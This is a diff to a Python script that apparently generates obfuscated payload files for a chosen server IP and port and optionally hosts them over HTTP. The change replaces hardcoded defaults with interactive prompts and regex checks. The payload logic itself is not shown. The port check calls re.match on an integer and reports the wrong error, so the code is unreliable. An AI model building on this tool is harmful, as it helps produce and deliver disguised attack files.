@@ -1,4 +1,4 @@
-import random,os,socket,http.server
+import random,os,socket,http.server,re,sys
 
 class Generate:
     def __init__(self,ip_address,port,filename,enable_obfuscation,host_after_generating,hosting_port):
@@ -116,7 +116,43 @@ class Generate:
 
         
 
+server_ip = input("Enter Server IP : ")
 
-app = Generate("127.0.0.1","80","kkk",True,True,8070)
+#validate ip address
+ip_pattern = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
+if not re.match(ip_pattern,server_ip):
+    print("[X] Invalid Ip address.")
+    sys.exit(0)
+
+
+server_port = input("Enter Port Number : ")
+
+#validate port
+port_pattern = r"^(?:[1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$"
+if not re.match(port_pattern,server_port):
+    print("[X] Invalid Ip address.")
+    sys.exit(0)
+
+filename = input("Name For The Generated File : ")
+obfuscate_script = input("Enable Obfuscation [y/n] : ")
+host_after_generating = input("Host After Generating [y/n] : ")
+enable_obfuscation = True if obfuscate_script=="y" else False
+enable_host = True if host_after_generating=="y" else False
+port_to_host = 0
+
+if enable_host == True:
+    port_to_host = int(input("Enter Port To Host : "))
+    if not re.match(port_pattern,port_to_host):
+        print("[X] Invalid Port! Defaulting to 8000")
+        port_to_host = 8000
+
+
+
+app = Generate(server_ip,server_port,filename,enable_obfuscation,enable_host,port_to_host)
 app.replace_and_create()
+
+
+# app = Generate("127.0.0.1","80","kkk",True,True,8070)
+# app.replace_and_create()
+
 
